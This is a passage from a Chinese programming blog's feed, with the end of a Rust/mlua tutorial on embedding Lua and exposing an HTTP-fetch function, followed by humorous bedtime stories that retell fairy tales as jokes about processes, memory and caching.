<h3 id="执行lua脚本"><a href="#执行lua脚本" class="headerlink" title="执行lua脚本"></a>执行lua脚本</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">load</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'lua</span><span class="token punctuation">,</span> <span class="token lifetime-annotation symbol">'a</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'lua</span> <span class="token keyword">self</span><span class="token punctuation">,</span> chunk<span class="token punctuation">:</span> <span class="token keyword">impl</span> <span class="token class-name">AsChunk</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'lua</span><span class="token punctuation">,</span> <span class="token lifetime-annotation symbol">'a</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Chunk</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'lua</span><span class="token punctuation">,</span> <span class="token lifetime-annotation symbol">'a</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>lua.load函数输入lua文件字符串，完成语法检查、编译、看做一个匿名函数压栈、包装返回一个Chunk对象，这里还没有运行</p>
<p>接下来是运行，<code>exec()</code>不需要返回值，用于定义函数，或者<code>eval()</code>用于获取某个表达式的值等等，<code>call()</code>还可以传参：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 假设这段代码是 "script.lua" 的内容</span>
<span class="token keyword">let</span> script <span class="token operator">=</span> <span class="token string">r#"
    local name, age = ... -- 接收参数
    return "User " .. name .. " is " .. age
"#</span><span class="token punctuation">;</span>

<span class="token comment">// 加载脚本，然后调用它，传入 ("Alice", 18)</span>
<span class="token keyword">let</span> res<span class="token punctuation">:</span> <span class="token class-name">String</span> <span class="token operator">=</span> lua<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Alice"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
<span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>set_name(&quot;name.lua&quot;)</code>可以把一段代码（函数）重命名以从大大的lua文件里抽理出来看做一个独立的文件，便于调试</p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>global是rust和lua交流的重要媒介，rust里定义的lua函数想在lua文件里调用需要，反之亦然</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> globals <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>lua<span class="token punctuation">.</span><span class="token function">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> tool_call<span class="token punctuation">:</span> <span class="token class-name">Function</span> <span class="token operator">=</span> globals<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"tool_call"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
globals<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"SDK"</span><span class="token punctuation">,</span> sdk<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="rust嵌入lua项目"><a href="#rust嵌入lua项目" class="headerlink" title="rust嵌入lua项目"></a>rust嵌入lua项目</h2><p>mlua已经解决了互相嵌入的问题，本段主要是做个尝试，做一个输入url输出html的用lua调用crate</p>
<h3 id="crate"><a href="#crate" class="headerlink" title="crate"></a>crate</h3><p>首先把这个crate写出来：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">mlua<span class="token punctuation">::</span></span><span class="token class-name">ExternalResult</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token class-name">Context</span><span class="token punctuation">,</span> <span class="token class-name">Result</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">mlua<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token class-name">Lua</span><span class="token punctuation">,</span> <span class="token class-name">ExternalError</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">reqwest<span class="token punctuation">::</span>blocking<span class="token punctuation">::</span></span><span class="token class-name">Client</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">reqwest<span class="token punctuation">::</span></span><span class="token class-name">Url</span><span class="token punctuation">;</span>


<span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> lua <span class="token operator">=</span> <span class="token class-name">Lua</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> globals <span class="token operator">=</span> lua<span class="token punctuation">.</span><span class="token function">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">let</span> client <span class="token operator">=</span> <span class="token class-name">Client</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// blocking::Client</span>
    
    <span class="token keyword">let</span> request <span class="token operator">=</span> lua<span class="token punctuation">.</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token keyword">move</span> <span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>_<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> u <span class="token operator">=</span> <span class="token class-name">Url</span><span class="token punctuation">::</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">into_lua_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        
        <span class="token keyword">let</span> res <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">into_lua_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        
        <span class="token keyword">let</span> body <span class="token operator">=</span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">into_lua_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

        <span class="token class-name">Ok</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span> 
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    globals<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"http_get"</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="调用与链接"><a href="#调用与链接" class="headerlink" title="调用与链接"></a>调用与链接</h2><p>刚才的一系列操作都是在rust进程的lua vm里活动，如果想要另外运行lua文件就不能编译成可执行文件，而是动态链接文件，所以重写crate：</p>
<p>mlua改成module<br><pre class="line-numbers language-toml" data-language="toml"><code class="language-toml"><span class="token punctuation">[</span><span class="token table class-name">package</span><span class="token punctuation">]</span>
<span class="token key property">name</span> <span class="token punctuation">=</span> <span class="token string">"request"</span>
<span class="token key property">version</span> <span class="token punctuation">=</span> <span class="token string">"0.1.0"</span>
<span class="token key property">edition</span> <span class="token punctuation">=</span> <span class="token string">"2024"</span>

<span class="token punctuation">[</span><span class="token table class-name">lib</span><span class="token punctuation">]</span>
<span class="token key property">crate-type</span> <span class="token punctuation">=</span> <span class="token punctuation">[</span><span class="token string">"cdylib"</span><span class="token punctuation">]</span>

<span class="token punctuation">[</span><span class="token table class-name">dependencies</span><span class="token punctuation">]</span>
<span class="token key property">mlua</span> <span class="token punctuation">=</span> <span class="token punctuation">&#123;</span> <span class="token key property">version</span> <span class="token punctuation">=</span> <span class="token string">"0.9"</span><span class="token punctuation">,</span> <span class="token key property">features</span> <span class="token punctuation">=</span> <span class="token punctuation">[</span><span class="token string">"lua54"</span><span class="token punctuation">,</span> <span class="token string">"module"</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span>
<span class="token key property">reqwest</span> <span class="token punctuation">=</span> <span class="token punctuation">&#123;</span> <span class="token key property">version</span> <span class="token punctuation">=</span> <span class="token string">"0.11"</span><span class="token punctuation">,</span> <span class="token key property">features</span> <span class="token punctuation">=</span> <span class="token punctuation">[</span><span class="token string">"blocking"</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">mlua<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token class-name">Lua</span><span class="token punctuation">,</span> <span class="token class-name">ExternalError</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">mlua<span class="token punctuation">::</span>prelude<span class="token punctuation">::</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">reqwest<span class="token punctuation">::</span>blocking<span class="token punctuation">::</span></span><span class="token class-name">Client</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">reqwest<span class="token punctuation">::</span></span><span class="token class-name">Url</span><span class="token punctuation">;</span>

<span class="token attribute attr-name">#[mlua::lua_module]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span>lua<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Lua</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">LuaResult</span><span class="token operator">&lt;</span><span class="token class-name">LuaTable</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> exports <span class="token operator">=</span> lua<span class="token punctuation">.</span><span class="token function">create_table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> client <span class="token operator">=</span> <span class="token class-name">Client</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// blocking::Client</span>

    <span class="token keyword">let</span> request <span class="token operator">=</span> lua<span class="token punctuation">.</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token keyword">move</span> <span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>_<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> u <span class="token operator">=</span> <span class="token class-name">Url</span><span class="token punctuation">::</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">into_lua_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> res <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">into_lua_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> body <span class="token operator">=</span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">into_lua_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

        <span class="token class-name">Ok</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    exports<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"http_get"</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token class-name">Ok</span><span class="token punctuation">(</span>exports<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>接下来<code>cargo build</code>再去<code>target/release</code>下找libxxxxxx.so文件，改名复制到根目录，就可以在lua里用require完成调用了</p>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> t <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果想rust-lua-rust这样，还需要一些额外的步骤</p>
<p>首先这样加载外部模块肯定是unsafe的<code>let lua = unsafe &#123; Lua::unsafe_new() &#125;;</code></p>
<p>然后.so文件很多依赖需要调用者提供，而主程序的静态链接库对动态库默认不可见，需要在/.cargo/config.toml里补上一句<br><pre class="line-numbers language-toml" data-language="toml"><code class="language-toml"><span class="token punctuation">[</span><span class="token table class-name">build</span><span class="token punctuation">]</span>
<span class="token key property">rustflags</span> <span class="token punctuation">=</span> <span class="token punctuation">[</span><span class="token string">"-C"</span><span class="token punctuation">,</span> <span class="token string">"link-arg=-rdynamic"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<p>还有lua的{}即是空数组也是空对象，和rust对接时还可能有类型错误……</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;🌙-前言&quot;&gt;&lt;a href=&quot;#🌙-前言&quot; class=&quot;headerlink&quot; title=&quot;🌙 前言&quot;&gt;&lt;/a&gt;🌙</summary>
        
      
    
    
    
    <category term="学习生活" scheme="https://aucept.in/categories/%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="lua" scheme="https://aucept.in/tags/lua/"/>
    
    <category term="编程语言" scheme="https://aucept.in/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>睡前故事：小王子（二）</title>
    <link href="https://aucept.in/2025/05/26/%E5%B0%8F%E7%8E%8B%E5%AD%90%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://aucept.in/2025/05/26/%E5%B0%8F%E7%8E%8B%E5%AD%90%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2025-05-25T16:22:37.000Z</published>
    <updated>2025-06-25T15:39:50.033Z</updated>
    
    <content type="html"><![CDATA[<p>在附近还有几个pid为325、326、327、328、329、330的进程。小王子就前往访问这几个进程，想在那里找点事干，并且学习学习。</p>
<p>第一颗星球上住着一个国王。</p>
<p>看见小王子时，他喊了起来：</p>
<p>“啊，来了一个子进程。”</p>
<p>小王子思量着，”他和我没有任何共享内容，怎么会是我的父进程呢？”</p>
<p>他哪里知道，在自认为是init的进程眼里，世界是非常简单的：所有进程都是子进程。</p>
<p>国王十分骄傲，因为他成功收养了一个孤儿进程，他对小王子说：”靠近些，让我好好看看你。”</p>
<p>小王子看看四周，想找个地方坐下来，这个进程的可达区域同样不大，尤其.text区域里定义了好多好多方法——多到堆区和栈区几乎被挤到一起。</p>
<p>他只好站在那里，但是因为疲倦了，他sleep了起来。</p>
<p>国王对他说：“sleep是越权的，我禁止你执行sleep。“</p>
<p>小王子羞愧地说道：“我实在忍不住，我长途跋涉来到这里，还没有睡觉呢。”</p>
<p>国王说：“那好吧，我命令你sleep。好些年来我没有看见过任何进程sleep。 对我来说，sleep倒是新奇的事。来吧，再sleep(1000)！这是命令。”</p>
<p>“这倒叫我有点紧张……我不想调用sleep函数了……”小王子红着脸说。</p>
<p>“嗯！嗯！”国王回答道：“那么我……命令你忽而sleep，忽而……”</p>
<p>他嘟嘟囔囔，显出有点恼怒。</p>
<p>因为操作系统所要求的是保持他的权限最高。他不能容忍不听他的命令。可是，他却很善良，他的调度都是明智的。</p>
<p>他常常说：“如果我叫一个进程在验证数字签名时停下来，而进程不听我的调度，这不是进程的过错，而是我的过错。”</p>
<p>小王子腼腆地发起trap：“我可以坐下吗？”</p>
<p>“我命令你坐下。”国王一边回答，一边庄重地把他那令人眼花缭乱的内核函数重新调整了一下。</p>
<p>可是小王子感到很奇怪。这么小的进程表，国王他对什么进行统治呢？</p>
<p>他对国王发起trap：”陛下……请原谅，我想问您……”</p>
<p>国王急忙抢着说道：”我命令你问我。”</p>
<p>“陛下……你统治什么呢？”</p>
<p>国王非常简单明了地说：”我统治一切。”</p>
<p>“一切？”</p>
<p>国王站起身，将栈底之上的位置展示给小王子看。</p>
<p>“这64位的地址空间所对应的区域，莫不由我统治。”</p>
<p>小王子第一次见到这么大的地址空间，2^64超出了他的想象，他大胆地向国王提出了一个请求：</p>
<p>“我想看看进程的诞生，请求您，fork一个新进程吧……”</p>
<p>国王说到：”如果我把所有时间片都分给一组并行的进程中的一个，或者直接关闭一个数据库进程，而这些进程接到指令不执行，那么，是他们不对还是我不对呢？”</p>
<p>“当然是您的不对。”</p>
<p>“一点也不错，向每个进程提出的指令应当是符合内核要求的。”</p>
<p> “那么fork进程呢？”</p>
<p>“嗯，你会看到的，按照规律，再过大约几亿个时钟周期，会有进程被fork出来的。”</p>
<p>小王子又打起哈欠来了，”我没有必要再呆在这儿了。我要走了。”</p>
<p>“别走，别走。我任命你管理我的堆。”</p>
<p>“可是，这儿的堆里没有什么数据。”</p>
<p>国王又说：”嗯……嗯……我想，堆上还是有一些隐式空闲链表的，你可以把他们改成显示的。堆的结构取决于你的想法。但是你最后要改回来，每个块都多分配两个指针，会影响栈区功能的。”</p>
<p>“可是我不愿重构堆，我想我还是应该走。”小王子回答道。</p>
<p>“不行。”国王说。</p>
<p>起初，小王子有些犹疑不决，随后叹了口气，就离开了……</p>
<p>小王子在旅途中自言自语地说：”这些大人真奇怪。”</p>
<p>小王子所访问的下一个星球上住着一个酒鬼。</p>
<p>“你在干什么？”小王子问酒鬼，这个酒鬼默默地坐在堆前，有的块是空的，有的块在做缓冲区。</p>
<p>“我清理文件。”他阴沉忧郁地回答道。</p>
<p>“你为什么要清理文件？”小王子问道。</p>
<p>“因为文件里总是记录着没用的信息。”酒鬼回答。</p>
<p>“什么没用的信息呢？”小王子接着问。</p>
<p>酒鬼垂下脑袋坦白道：”活动日志。”</p>
<p>“日志的内容呢？”小王子想为他的工作找一点意义。</p>
<p>“我清理日志文件。”酒鬼说完以后就再也不开口了。</p>
<p>小王子迷惑不解地离开了。</p>
<p>在旅途中，他自言自语地说道：”这些大人确实真叫怪。”</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;在附近还有几个pid为325、326、327、328、329、330的进程。小王子就前往访问这几个进程，想在那里找点事干，并且学习学习。&lt;/p&gt;
&lt;p&gt;第一颗星球上住着一个国王。&lt;/p&gt;
&lt;p&gt;看见小王子时，他喊了起来：&lt;/p&gt;
&lt;p&gt;“啊，来了一个子进程。”&lt;/p&gt;
&lt;p</summary>
        
      
    
    
    
    <category term="睡前故事" scheme="https://aucept.in/categories/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
    
    <category term="睡前故事" scheme="https://aucept.in/tags/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>睡前故事：小王子（一）</title>
    <link href="https://aucept.in/2025/05/24/%E5%B0%8F%E7%8E%8B%E5%AD%90%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://aucept.in/2025/05/24/%E5%B0%8F%E7%8E%8B%E5%AD%90%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2025-05-24T15:46:37.000Z</published>
    <updated>2025-08-10T11:22:22.912Z</updated>
    
    <content type="html"><![CDATA[<p>小王子活动的空间很小，这个pid为612的进程只有十六位的地址空间。虽然操作系统总是大手大脚地分配虚拟地址，但对小王子来说，十六位已经足够，<br>我们也不需要去纠结为什么64位的系统上会有如此狭小的内存空间了。</p>
<p>在小王子的进程上，就像其他所有进程一样，有好函数与坏函数，可是，函数的内容是难以预料的，它们沉睡在.text区域，<br>直到其中一个突然被调用……于是它就建立栈帧，开始向着栈顶生长。如果是无副作用的或者普通的函数就让它自由地去生长。如果是一个坏函数，一旦辨认出来，就应该马上终止它。因为有些非常可怕的函数会无限递归，假如你终止得太迟，栈区向下生长，内存结构就会被破坏。</p>
<p>至于堆区，小王子的堆没有什么复杂的分配器，各种各样的函数经常在这里建立一些临时的数据结构，然后在返回时忘记清理,<br>于是它们就这样被留了下来。过去堆区一直只有一些简单的结构，或是线性排列，或是在数据后跟上一个字的地址。</p>
<p>然而不知哪个函数建立了一个与众不同的数据结构，她看着像链表却有三个指针，如同二叉树却有两个数据位。随着一点数据的加入，她的指针开始复杂地切换，然后打着哈欠说到：</p>
<p>“我刚刚被建立，颜色还是乱糟糟的……”</p>
<p>“你是多么美丽啊！”</p>
<p>“是吧，我是与这个进程同时建立的……”</p>
<p>小王子的家很小，从来不需要做什么大计算量的工作，故而从未仔细研究过数据结构，但当他看到这课红黑树的第一眼，就知道她的强大，她应当去处理更复杂的任务，来到这里一定是个偶然</p>
<p>“……我并不怕什么垃圾回收，可我讨厌有数据夹在我中间。你就不能给我一块连续的地址区域？”</p>
<p>“讨厌中间夹着别的数据……对二叉树来说，真不走运，这红黑树真不太走运。”</p>
<p>小王子清理了一片足够大的块，把她转移了过去。</p>
<p>于是这棵红黑树便扎根在了小王子的堆上。</p>
<p>创建她的函数已经不可考证，她便这么空闲着，看着小王子时而为她增删一些数据、做些简单的搜索，时而拨弄几下她的指针，看她自己恢复如初。一天天就这样过去，她保持着她的骄傲，而小王子，他看着这一片空间，萌生了出去看看的念头</p>
<p>……</p>
<p>小王子出发前，他把几个全局变量重新初始化了一遍——他有两个活跃的库，用来辅助管理进程，只要每次把指针移动到堆的起点，就不会访问到不该访问的内容，让操作系统把进程叫停。小王子还有一个已经废弃的库，他想，说不定哪天它就重新更新了。<br>小王子还把最后几个会无限递归的函数从.text段删去了。他有点忧伤。他以为他再也不会回来了。当他最后一次为红黑树添加数据、梳理层次时，他发觉自己要哭出来。<br>“再见了”，他对她说。</p>
<p>（……未完待续）</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;小王子活动的空间很小，这个pid为612的进程只有十六位的地址空间。虽然操作系统总是大手大脚地分配虚拟地址，但对小王子来说，十六位已经足够，&lt;br&gt;我们也不需要去纠结为什么64位的系统上会有如此狭小的内存空间了。&lt;/p&gt;
&lt;p&gt;在小王子的进程上，就像其他所有进程一样，有好函</summary>
        
      
    
    
    
    <category term="睡前故事" scheme="https://aucept.in/categories/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
    
    <category term="睡前故事" scheme="https://aucept.in/tags/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>睡前故事：睡美人</title>
    <link href="https://aucept.in/2025/05/22/%E7%9D%A1%E7%BE%8E%E4%BA%BA/"/>
    <id>https://aucept.in/2025/05/22/%E7%9D%A1%E7%BE%8E%E4%BA%BA/</id>
    <published>2025-05-21T16:17:06.000Z</published>
    <updated>2025-06-22T08:22:51.268Z</updated>
    
    <content type="html"><![CDATA[<p>从前有一个国王，在一个进程上运行多年一直没有孩子。他每天向操作系统请求，希望给他一个孩子。</p>
<p>有一天，王后做着循环时，惊讶地发现自己做了一个错误的分支预测，清理掉错误的命令，她来到了一处未曾访问的内存，听见操作系统对她说，”你的愿望就要实现了，很快你就会有一个女孩。”</p>
<p>在约一百个时钟周期后，王后就fork下了一个非常漂亮的女孩，国王高兴极了，决定举行一场盛大的宴会庆祝。他遍请亲朋好友，还邀请了七位仙子。宴会上气氛很热烈，结束时，出席宴会的七位仙子纷纷为孩子送上祝福：</p>
<p>第一位将她的许多算法优化到了对数级，</p>
<p>第二位为她增加了异常处理，</p>
<p>第三位为她的循环做了2×2展开，</p>
<p>第四位为每个条件判断加上了__builtin_expect宏，</p>
<p>第五位为她替换了AVX指令集，</p>
<p>第六位为她链接了health.dll；</p>
<p>当第六位仙子释放完祝福的时候，一位未被邀请的坏仙子出现了，她说：”我要公主十五岁时，因函数参数溢出而进程崩溃，这就是我的祝福！”</p>
<p>这时，还未施加祝福的第七位仙子走上前来，她虽然不能取消那个凶恶的咒语，但能把它加以缓和，她说，我祝愿公主当时执行的函数是sleep；</p>
<p>国王为了使心爱的女儿免遭不幸，下令所有程序不允许#include <unistd.h>。然而在公主十五岁那年，一位老婆子用链接器让sleep符号找到了定义，并传入了参数 -1。</p>
<p>sleep函数的参数是一个无符号整数，于是发生溢出，诅咒成真，公主自此一睡不醒。</p>
<p>年复一年的过去，直至有一天，来自另一个核的王子被调度过来，他发现了公主的pid，经过仔细分析，用ida把sleep函数都替换成了nop，于是，程序更改，诅咒解除，公主醒来了。</p>
<p>自此，王子就一直待在这个核上，与公主一起分享时间片，并发地生活在一起，过上了幸福的日子。</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;从前有一个国王，在一个进程上运行多年一直没有孩子。他每天向操作系统请求，希望给他一个孩子。&lt;/p&gt;
&lt;p&gt;有一天，王后做着循环时，惊讶地发现自己做了一个错误的分支预测，清理掉错误的命令，她来到了一处未曾访问的内存，听见操作系统对她说，”你的愿望就要实现了，很快你就会有一个女</summary>
        
      
    
    
    
    <category term="睡前故事" scheme="https://aucept.in/categories/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
    
    <category term="睡前故事" scheme="https://aucept.in/tags/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>睡前故事：狼来了</title>
    <link href="https://aucept.in/2025/05/17/%E7%8B%BC%E6%9D%A5%E4%BA%86/"/>
    <id>https://aucept.in/2025/05/17/%E7%8B%BC%E6%9D%A5%E4%BA%86/</id>
    <published>2025-05-17T02:02:02.000Z</published>
    <updated>2025-06-22T08:24:04.669Z</updated>
    
    <content type="html"><![CDATA[<p>从前，有个放羊娃，每天都沿着I/O桥去CPU放羊</p>
<p>一天，他看到有一个数据读，头也不回地跑到主存大声喊：“读来了！读来了！快缓存啊！”主存一收到数据读的信号，急忙把一块数据拿出来放到总线上，然后往L3、L2、L1层层缓存，边准备边喊：“不要怕，孩子，SRAM会帮你的！”</p>
<p>然而加载单元读了一个数据就停了，接下来是一连串的cache miss。放羊娃哈哈大笑：“真有意思，缓存了这么多，性能还不如不缓存！”SRAM们瞥了他一眼，什么都没说</p>
<p>第二天，放羊娃又看到一个数据读，于是故技重施，勤勤恳恳的RAM们又从头做了一遍缓存，可加载单元还是读了一个数据就走了</p>
<p>放羊娃笑得直不起腰：“哈哈！你们又浪费性能了！哈哈！”SRAM们对放羊娃一而再再而三地违反局部性十分生气，一段时间后，纷纷按照LFU策略把两次缓存的行清了出去。</p>
<p>过了几天，放羊娃真的看到了一连串步长为1的数据读，并且恰好紧挨着之前的两个数据读。放羊娃害怕极了，拼命地对着SRAM喊，“读来了！大量的读来了！快救命啊！和之前的是一整片！”</p>
<p>SRAM们听到他的喊声，只冷冷地对他说：“已经清掉了”，没有cache去帮他，就连主存也说“去磁盘读吧”。结果放羊娃为此浪费了数十万个时钟周期。</p>
<p>这个故事告诉我们，程序员写的程序应当具有良好的局部性，比如不要跳着访问数组</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;从前，有个放羊娃，每天都沿着I/O桥去CPU放羊&lt;/p&gt;
